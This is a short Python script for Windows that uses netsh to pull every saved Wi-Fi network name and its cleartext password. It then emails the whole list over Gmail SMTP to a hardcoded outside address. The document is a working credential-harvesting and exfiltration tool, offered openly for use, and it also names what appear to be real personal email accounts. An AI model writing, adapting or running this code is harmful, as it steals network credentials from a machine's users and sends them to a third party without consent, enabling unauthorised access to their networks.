#importing important modules
import os
import re
import subprocess
import smtplib
from email.message import EmailMessage
#stream = os.popen('netsh wlan show profiles')
#output = stream.read()

#creating a list to store all the wifi names and password grabbed by the script
new = list()

#running cmd command using subprocess module this will return the output as returned in the terminal
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

#formatting the data returned by the above command to select all th profile names using re module
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

#looping through the profiles names given by the above command
for name in profile_names:

	#creating a dictionary to store data with key ssid and password and their respective values
	data = dict()

	#similar subprocess command to get the data about the selected profile with password visibility true
	command = subprocess.run(["netsh", "wlan", "show", "profiles", name,"key=clear"], capture_output = True).stdout.decode()
	#print(command)

	#formatting data given by above command to get the password of the respective profile name
	password = re.findall("Key Content            : (.*)\r", command)
	#cheking if the password field is empty or it contains data
	#if no password is there then add none to the dictionary with its ssid added to the dictionary with respective keys 
	if password == []:
		data['ssid'] = name
		data['password'] = '[none]'

	#if password is found then adding the ssid and its password to dictionary
	else:
		data['ssid'] = name
		data['password'] = password

	#finally appending the dictionary to the list we created above 
	new.append(data)

#at last when  all the profile data has been appended to the list , looping through the list to print the appended data
for i in new:
	print(i)

#mailing all the data we retrieved to us
# Create the message for the email
email_message = ""
for item in new:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessage()
# Who is the email from
email["from"] = "Nitish"
# To which email you want to send the email
email["to"] = "006nschaudhary006@gmail.com"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

#setting up username and password
email_id = "ncnitish6250@gmail.com"
password = " "
# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password
    smtp.login(email_id, password)
    # Send email.
    smtp.send_message(email)
